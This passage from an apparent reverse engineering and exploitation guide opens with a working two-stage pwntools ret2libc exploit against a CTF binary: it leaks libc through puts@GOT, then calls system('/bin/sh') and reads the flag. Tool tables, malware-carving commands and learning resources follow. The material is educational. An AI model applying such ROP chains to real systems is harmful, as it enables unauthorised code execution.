style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">72</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">puts_got</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># rdi = puts@GOT</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">puts_plt</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                 </span><span class="token comment" style="color:#999988;font-style:italic"># Call puts(puts@GOT) -&gt; leak libc</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">main</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                     </span><span class="token comment" style="color:#999988;font-style:italic"># Return to main</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;./chall&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">leak </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> u64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">strip</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ljust</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&#x27;\x00&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libc_base </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> leak </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x809c0</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Offset to puts in libc</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">system </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc_base </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4f440</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin_sh </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> libc_base </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1b3e9a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Stage 2: Call system(&quot;/bin/sh&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">72</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload2 </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ret</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Stack alignment</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload2 </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rdi</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">bin_sh</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload2 </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">system</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">interactive</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Shell!</span><br></span></code></pre></div></div>
<p><strong>5. Submit flag:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># In shell:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> flag.txt</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="tools-reference">Tools Reference<a href="#tools-reference" class="hash-link" aria-label="Direct link to Tools Reference" title="Direct link to Tools Reference" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="disassemblers--decompilers-1">Disassemblers &amp; Decompilers<a href="#disassemblers--decompilers-1" class="hash-link" aria-label="Direct link to Disassemblers &amp; Decompilers" title="Direct link to Disassemblers &amp; Decompilers" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Type</th><th>Platform</th><th>Cost</th><th>Download</th></tr></thead><tbody><tr><td><strong>IDA Pro</strong></td><td>Disassembler + Decompiler</td><td>Win/Linux/macOS</td><td>$$$</td><td><a href="https://hex-rays.com/ida-pro/" target="_blank" rel="noopener noreferrer" class="">https://hex-rays.com/ida-pro/</a></td></tr><tr><td><strong>Ghidra</strong></td><td>Disassembler + Decompiler</td><td>Win/Linux/macOS</td><td>Free</td><td><a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreferrer" class="">https://ghidra-sre.org/</a></td></tr><tr><td><strong>Binary Ninja</strong></td><td>Disassembler + Decompiler</td><td>Win/Linux/macOS</td><td>$$</td><td><a href="https://binary.ninja/" target="_blank" rel="noopener noreferrer" class="">https://binary.ninja/</a></td></tr><tr><td><strong>Radare2</strong></td><td>Disassembler</td><td>Win/Linux/macOS</td><td>Free</td><td><a href="https://rada.re/" target="_blank" rel="noopener noreferrer" class="">https://rada.re/</a></td></tr><tr><td><strong>Cutter</strong></td><td>Disassembler (r2 GUI)</td><td>Win/Linux/macOS</td><td>Free</td><td><a href="https://cutter.re/" target="_blank" rel="noopener noreferrer" class="">https://cutter.re/</a></td></tr><tr><td><strong>Hopper</strong></td><td>Disassembler + Decompiler</td><td>macOS/Linux</td><td>$</td><td><a href="https://www.hopperapp.com/" target="_blank" rel="noopener noreferrer" class="">https://www.hopperapp.com/</a></td></tr><tr><td><strong>RetDec</strong></td><td>Decompiler (online/CLI)</td><td>Web/Linux</td><td>Free</td><td><a href="https://retdec.com/" target="_blank" rel="noopener noreferrer" class="">https://retdec.com/</a></td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="debuggers-1">Debuggers<a href="#debuggers-1" class="hash-link" aria-label="Direct link to Debuggers" title="Direct link to Debuggers" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Platform</th><th>Best For</th></tr></thead><tbody><tr><td><strong>x64dbg</strong></td><td>Windows</td><td>Windows user-mode, malware, CTF</td></tr><tr><td><strong>WinDbg</strong></td><td>Windows</td><td>Kernel debugging, crash analysis</td></tr><tr><td><strong>GDB</strong></td><td>Linux/macOS</td><td>Linux/macOS debugging, exploits, Python scripting (PEDA/GEF/pwndbg)</td></tr><tr><td><strong>LLDB</strong></td><td>macOS/Linux</td><td>macOS/iOS, modern alternative to GDB</td></tr><tr><td><strong>OllyDbg</strong></td><td>Windows</td><td>Legacy 32-bit (x64dbg recommended)</td></tr><tr><td><strong>IDA Debugger</strong></td><td>Win/Linux/macOS</td><td>Integrated with IDA disassembly</td></tr><tr><td><strong>EDB</strong></td><td>Linux</td><td>Linux GUI debugger</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="dynamic-instrumentation">Dynamic Instrumentation<a href="#dynamic-instrumentation" class="hash-link" aria-label="Direct link to Dynamic Instrumentation" title="Direct link to Dynamic Instrumentation" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Platform</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>Frida</strong></td><td>Win/Linux/macOS/Android/iOS</td><td>Runtime hooking, API monitoring</td></tr><tr><td><strong>DynamoRIO</strong></td><td>Win/Linux</td><td>Dynamic binary instrumentation framework</td></tr><tr><td><strong>Pin</strong></td><td>Win/Linux</td><td>Intel&#x27;s instrumentation tool</td></tr><tr><td><strong>Unicorn</strong></td><td>All</td><td>CPU emulator for RE (based on QEMU)</td></tr><tr><td><strong>Qiling</strong></td><td>All</td><td>Binary emulation framework</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="platform-specific-tools">Platform-Specific Tools<a href="#platform-specific-tools" class="hash-link" aria-label="Direct link to Platform-Specific Tools" title="Direct link to Platform-Specific Tools" translate="no">​</a></h3>
<p><strong>Windows:</strong></p>
<ul>
<li class=""><strong>PE-bear:</strong> PE editor/analyzer</li>
<li class=""><strong>PEview:</strong> PE structure viewer</li>
<li class=""><strong>CFF Explorer:</strong> PE editor</li>
<li class=""><strong>Process Hacker:</strong> Process monitoring</li>
<li class=""><strong>Procmon:</strong> File/registry/network monitoring</li>
</ul>
<p><strong>Linux:</strong></p>
<ul>
<li class=""><strong>readelf:</strong> ELF header analysis</li>
<li class=""><strong>objdump:</strong> Disassembler</li>
<li class=""><strong>ltrace:</strong> Library call tracer</li>
<li class=""><strong>strace:</strong> System call tracer</li>
<li class=""><strong>ldd:</strong> List dynamic dependencies</li>
</ul>
<p><strong>.NET:</strong></p>
<ul>
<li class=""><strong>dnSpy:</strong> Decompiler + debugger</li>
<li class=""><strong>ILSpy:</strong> Decompiler</li>
<li class=""><strong>dotPeek:</strong> Decompiler (JetBrains)</li>
<li class=""><strong>de4dot:</strong> Deobfuscator</li>
</ul>
<p><strong>Android:</strong></p>
<ul>
<li class=""><strong>JADX:</strong> DEX to Java decompiler</li>
<li class=""><strong>Apktool:</strong> APK decoder/builder</li>
<li class=""><strong>dex2jar:</strong> DEX to JAR converter</li>
<li class=""><strong>JD-GUI:</strong> Java decompiler</li>
<li class=""><strong>Frida:</strong> Dynamic instrumentation</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploit-development-1">Exploit Development<a href="#exploit-development-1" class="hash-link" aria-label="Direct link to Exploit Development" title="Direct link to Exploit Development" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>pwntools</strong></td><td>Python exploit framework</td></tr><tr><td><strong>ROPgadget</strong></td><td>ROP gadget finder</td></tr><tr><td><strong>ropper</strong></td><td>ROP gadget finder (more features)</td></tr><tr><td><strong>msfvenom</strong></td><td>Shellcode generator (Metasploit)</td></tr><tr><td><strong>one_gadget</strong></td><td>Find one-shot RCE gadgets in libc</td></tr><tr><td><strong>pwndbg/GEF/PEDA</strong></td><td>GDB enhancements for exploit dev</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="utilities">Utilities<a href="#utilities" class="hash-link" aria-label="Direct link to Utilities" title="Direct link to Utilities" translate="no">​</a></h3>
<table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody><tr><td><strong>HxD</strong></td><td>Hex editor (Windows)</td></tr><tr><td><strong>010 Editor</strong></td><td>Hex editor with templates</td></tr><tr><td><strong>Detect It Easy</strong></td><td>Packer/compiler detection</td></tr><tr><td><strong>Entropy</strong></td><td>Measure file entropy (detect packing)</td></tr><tr><td><strong>UPX</strong></td><td>Packer/unpacker</td></tr><tr><td><strong>PEiD</strong></td><td>Packer/compiler detection (legacy)</td></tr><tr><td><strong>Binary Refinery</strong></td><td>Python-based binary analysis toolkit with 100+ tools for data extraction, deobfuscation, and format parsing</td></tr></tbody></table>
<p><strong>Binary Refinery usage:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Install Binary Refinery:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> binary-refinery</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Extract strings from binary:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">emit malware.exe </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> carve string </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> peek</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Decode XOR-encoded data:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">emit encoded.bin </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> xor key:0x42 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> peek</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Extract embedded PE files:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">emit packed.exe </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> carve pe </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> dump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Chain multiple operations:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">emit data.bin </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> xor key:0x13 </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> zl </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> carve url </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> peek</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="learning-resources">Learning Resources<a href="#learning-resources" class="hash-link" aria-label="Direct link to Learning Resources" title="Direct link to Learning Resources" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="books">Books<a href="#books" class="hash-link" aria-label="Direct link to Books" title="Direct link to Books" translate="no">​</a></h3>
<ul>
<li class=""><strong>Practical Reverse Engineering</strong> by Bruce Dang et al. (x86/x64/ARM reversing)</li>
<li class=""><strong>The IDA Pro Book</strong> by Chris Eagle (IDA Pro deep dive)</li>
<li class=""><strong>Reversing: Secrets of Reverse Engineering</strong> by Eldad Eilam (fundamentals)</li>
<li class=""><strong>The Art of Software Security Assessment</strong> by Mark Dowd et al. (vulnerability research)</li>
<li class=""><strong>Hacking: The Art of Exploitation</strong> by Jon Erickson (exploit development)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="practice-platforms">Practice Platforms<a href="#practice-platforms" class="hash-link" aria-label="Direct link to Practice Platforms" title="Direct link to Practice Platforms" translate="no">​</a></h3>
<ul>
<li class=""><strong>Crackmes.one:</strong> <a href="https://crackmes.one/" target="_blank" rel="noopener noreferrer" class="">https://crackmes.one/</a> (reversing challenges)</li>
<li class=""><strong>ReverseEngineering.StackExchange:</strong> <a href="https://reverseengineering.stackexchange.com/" target="_blank" rel="noopener noreferrer" class="">https://reverseengineering.stackexchange.com/</a></li>
<li class=""><strong>CTFtime:</strong> <a href="https://ctftime.org/" target="_blank" rel="noopener noreferrer" class="">https://ctftime.org/</a> (CTF competitions with RE challenges)</li>
<li class=""><strong>PicoCTF:</strong> <a href="https://picoctf.org/" target="_blank" rel="noopener noreferrer" class="">https://picoctf.org/</a> (beginner-friendly CTF)</li>
<li class=""><strong>HackTheBox:</strong> <a href="https://www.hackthebox.eu/" target="_blank" rel="noopener noreferrer" class="">https://www.hackthebox.eu/</a> (reversing &amp; exploitation)</li>
<li class=""><strong>Pwnable.kr / Pwnable.tw:</strong> (binary exploitation practice)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="online-courses">Online Courses<a href="#online-courses" class="hash-link" aria-label="Direct link to Online Courses" title="Direct link to Online Courses" translate="no">​</a></h3>
<ul>
<li class=""><strong>Malware Analysis Bootcamp (SANS FOR610)</strong></li>
<li class=""><strong>Reverse Engineering Malware (SANS FOR610)</strong></li>
<li class=""><strong>Practical Malware Analysis &amp; Triage (PMAT)</strong> by TCM Security</li>
<li class=""><strong>LiveOverflow YouTube:</strong> <a href="https://www.youtube.com/c/LiveOverflow" target="_blank" rel="noopener noreferrer" class="">https://www.youtube.com/c/LiveOverflow</a> (binary exploitation)</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="reference-resources">Reference Resources<a href="#reference-resources" class="hash-link" aria-label="Direct link to Reference Resources" title="Direct link to Reference Resources" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="comprehensive-knowledge-bases">Comprehensive Knowledge Bases<a href="#comprehensive-knowledge-bases" class="hash-link" aria-label="Direct link to Comprehensive Knowledge Bases" title="Direct link to Comprehensive Knowledge Bases" translate="no">​</a></h3>
<ul>
<li class=""><strong>HackTricks - Binary Exploitation</strong> - <a href="https://book.hacktricks.xyz/binary-exploitation" target="_blank" rel="noopener noreferrer" class="">book.hacktricks.xyz/binary-exploitation</a>
<ul>
<li class="">Stack/heap overflows, ROP, format strings</li>
<li class="">Linux and Windows exploit techniques</li>
</ul>
</li>
<li class=""><strong>Nightmare (Binary Exploitation)</strong> - <a href="https://guyinatuxedo.github.io/" target="_blank" rel="noopener noreferrer" class="">guyinatuxedo.github.io</a>
<ul>
<li class="">Comprehensive CTF binary exploitation course</li>
<li class="">Covers stack overflows, ROP, heap exploitation, kernel exploitation</li>
</ul>
</li>
<li class=""><strong>Reverse Engineering for Beginners</strong> - <a href="https://beginners.re/" target="_blank" rel="noopener noreferrer" class="">beginners.re</a>
<ul>
<li class="">Free book by Dennis Yurichev</li>
<li class="">Covers x86/ARM assembly, disassembly, patterns</li>
</ul>
</li>
<li class=""><strong>Malware Unicorn&#x27;s Reverse Engineering 101</strong> - <a href="https://malwareunicorn.org/workshops/re101.html" target="_blank" rel="noopener noreferrer" class="">malwareunicorn.org/workshops/re101.html</a>
<ul>
<li class="">Beginner-friendly RE workshop materials</li>
<li class="">x86 assembly, IDA Pro, malware analysis</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="assembly--architecture-resources">Assembly &amp; Architecture Resources<a href="#assembly--architecture-resources" class="hash-link" aria-label="Direct link to Assembly &amp; Architecture Resources" title="Direct link to Assembly &amp; Architecture Resources" translate="no">​</a></h3>
<ul>
<li class=""><strong>x86 Assembly Guide (UVA)</strong> - <a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html" target="_blank" rel="noopener noreferrer" class="">cs.virginia.edu/~evans/cs216/guides/x86.html</a>
<ul>
<li class="">x86 assembly reference and calling conventions</li>
</ul>
</li>
<li class=""><strong>Intel Software Developer Manuals</strong> - <a href="https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html" target="_blank" rel="noopener noreferrer" class="">intel.com/sdm</a>
<ul>
<li class="">Official x86/x64 instruction set reference</li>
</ul>
</li>
<li class=""><strong>ARM Architecture Reference Manual</strong> - <a href="https://developer.arm.com/documentation/" target="_blank" rel="noopener noreferrer" class="">developer.arm.com</a>
<ul>
<li class="">Official ARM instruction set documentation</li>
</ul>
</li>
<li class=""><strong>Agner Fog&#x27;s Optimization Manuals</strong> - <a href="https://www.agner.org/optimize/" target="_blank" rel="noopener noreferrer" class="">agner.org/optimize</a>
<ul>
<li class="">x86 assembly optimization and microarchitecture guides</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="tool-documentation">Tool Documentation<a href="#tool-documentation" class="hash-link" aria-label="Direct link to Tool Documentation" title="Direct link to Tool Documentation" translate="no">​</a></h3>
<ul>
<li class=""><strong>Ghidra Documentation</strong> - <a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreferrer" class="">ghidra-sre.org</a>
<ul>
<li class="">Official Ghidra user guide and scripting reference</li>
<li class="">P-Code (Ghidra&#x27;s intermediate language) documentation</li>
</ul>
</li>
<li class=""><strong>IDA Pro Documentation</strong> - <a href="https://hex-rays.com/documentation/" target="_blank" rel="noopener noreferrer" class="">hex-rays.com/documentation</a>
<ul>
<li class="">IDA Pro and Hex-Rays decompiler manuals</li>
<li class="">IDAPython API reference</li>
</ul>
</li>
<li class=""><strong>Binary Ninja Documentation</strong> - <a href="https://docs.binary.ninja/" target="_blank" rel="noopener noreferrer" class="">docs.binary.ninja</a>
<ul>
<li class="">Binary Ninja Python API and BNIL documentation</li>
</ul>
</li>
<li class=""><strong>Radare2 Book</strong> - <a href="https://book.rada.re/" target="_blank" rel="noopener noreferrer" class="">book.rada.re</a>
<ul>
<li class="">Comprehensive radare2 guide</li>
</ul>
</li>
<li class=""><strong>x64dbg Documentation</strong> - <a href="https://help.x64dbg.com/" target="_blank" rel="noopener noreferrer" class="">help.x64dbg.com</a>
<ul>
<li class="">x64dbg debugger reference</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="binary-formats">Binary Formats<a href="#binary-formats" class="hash-link" aria-label="Direct link to Binary Formats" title="Direct link to Binary Formats" translate="no">​</a></h3>
<ul>
<li class=""><strong>Portable Executable (PE) Format</strong> - <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format" target="_blank" rel="noopener noreferrer" class="">docs.microsoft.com/en-us/windows/win32/debug/pe-format</a>
<ul>
<li class="">Official Microsoft PE format specification</li>
</ul>
</li>
<li class=""><strong>ELF Format Specification</strong> - <a href="https://refspecs.linuxbase.org/elf/elf.pdf" target="_blank" rel="noopener noreferrer" class="">refspecs.linuxbase.org/elf/elf.pdf</a>
<ul>
<li class="">Official ELF (Linux/Unix) format specification</li>
</ul>
</li>
<li class=""><strong>Mach-O Format (macOS)</strong> - <a href="https://github.com/aidansteele/osx-abi-macho-file-format-reference" target="_blank" rel="noopener noreferrer" class="">github.com/aidansteele/osx-abi-macho-file-format-reference</a>
<ul>
<li class="">Apple Mach-O executable format reference</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploit-development-resources">Exploit Development Resources<a href="#exploit-development-resources" class="hash-link" aria-label="Direct link to Exploit Development Resources" title="Direct link to Exploit Development Resources" translate="no">​</a></h3>
<ul>
<li class=""><strong>Exploit Education</strong> - <a href="https://exploit.education/" target="_blank" rel="noopener noreferrer" class="">exploit.education</a>
<ul>
<li class="">Phoenix, Nebula, Fusion VM challenges</li>
<li class="">Hands-on binary exploitation practice</li>
</ul>
</li>
<li class=""><strong>ROP Emporium</strong> - <a href="https://ropemporium.com/" target="_blank" rel="noopener noreferrer" class="">ropemporium.com</a>
<ul>
<li class="">ROP (Return-Oriented Programming) challenges</li>
<li class="">Progressively difficult exploit development exercises</li>
</ul>
</li>
<li class=""><strong>pwn.college</strong> - <a href="https://pwn.college/" target="_blank" rel="noopener noreferrer" class="">pwn.college</a>
<ul>
<li class="">Arizona State University&#x27;s binary exploitation course</li>
<li class="">Covers assembly, shellcode, ROP, heap exploitation</li>
</ul>
</li>
<li class=""><strong>how2heap</strong> - <a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener noreferrer" class="">github.com/shellphish/how2heap</a>
<ul>
<li class="">Heap exploitation techniques and examples</li>
</ul>
</li>
<li class=""><strong>Shellcode Database</strong> - <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener noreferrer" class="">shell-storm.org/shellcode</a>
<ul>
<li class="">Collection of shellcode for various architectures</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cheat-sheets--quick-references">Cheat Sheets &amp; Quick References<a href="#cheat-sheets--quick-references" class="hash-link" aria-label="Direct link to Cheat Sheets &amp; Quick References" title="Direct link to Cheat Sheets &amp; Quick References" translate="no">​</a></h3>
<ul>
<li class=""><strong>x86/x64 Opcode Reference</strong> - <a href="http://ref.x86asm.net/" target="_blank" rel="noopener noreferrer" class="">ref.x86asm.net</a>
<ul>
<li class="">Quick x86 instruction reference</li>
</ul>
</li>
<li class=""><strong>Syscall Tables</strong> - <a href="https://syscalls.w3challs.com/" target="_blank" rel="noopener noreferrer" class="">syscalls.w3challs.com</a>
<ul>
<li class="">Linux/Windows syscall numbers and arguments</li>
</ul>
</li>
<li class=""><strong>GTFOBins</strong> - <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer" class="">gtfobins.github.io</a>
<ul>
<li class="">Unix binary exploitation techniques (sudo, SUID, capabilities)</li>
</ul>
</li>
<li class=""><strong>LOLBAS Project</strong> - <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer" class="">lolbas-project.github.io</a>
<ul>
<li class="">Living Off the Land Binaries (Windows exploitation)</li>
</ul>
</li>
<li class=""><strong>Calling Conventions Cheat Sheet</strong> - <a href="https://www.agner.org/optimize/calling_conventions.pdf" target="_blank" rel="noopener noreferrer" class="">agner.org/optimize/calling_conventions.pdf</a>
<ul>
<li class="">x86/x64 calling convention reference</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="disassembly-patterns--idioms">Disassembly Patterns &amp; Idioms<a href="#disassembly-patterns--idioms" class="hash-link" aria-label="Direct link to Disassembly Patterns &amp; Idioms" title="Direct link to Disassembly Patterns &amp; Idioms" translate="no">​</a></h3>
<ul>
<li class=""><strong>Hex-Rays Microcode Documentation</strong> - <a href="https://hex-rays.com/products/ida/support/idapython_docs/" target="_blank" rel="noopener noreferrer" class="">hex-rays.com/products/ida/support/idapython_docs/</a>
<ul>
<li class="">Understanding Hex-Rays decompiler internals</li>
</ul>
</li>
<li class=""><strong>Binary Ninja IL Reference</strong> - <a href="https://docs.binary.ninja/dev/bnil-overview.html" target="_blank" rel="noopener noreferrer" class="">docs.binary.ninja/dev/bnil-overview.html</a>
<ul>
<li class="">Understanding Binary Ninja&#x27;s intermediate languages</li>
</ul>
</li>
<li class=""><strong>Compiler Explorer (Godbolt)</strong> - <a href="https://godbolt.org/" target="_blank" rel="noopener noreferrer" class="">godbolt.org</a>
<ul>
<li class="">See how C/C++ compiles to assembly for various compilers</li>
<li class="">Understand compiler optimizations and patterns</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="anti-reversing--obfuscation">Anti-Reversing &amp; Obfuscation<a href="#anti-reversing--obfuscation" class="hash-link" aria-label="Direct link to Anti-Reversing &amp; Obfuscation" title="Direct link to Anti-Reversing &amp; Obfuscation" translate="no">​</a></h3>
<ul>
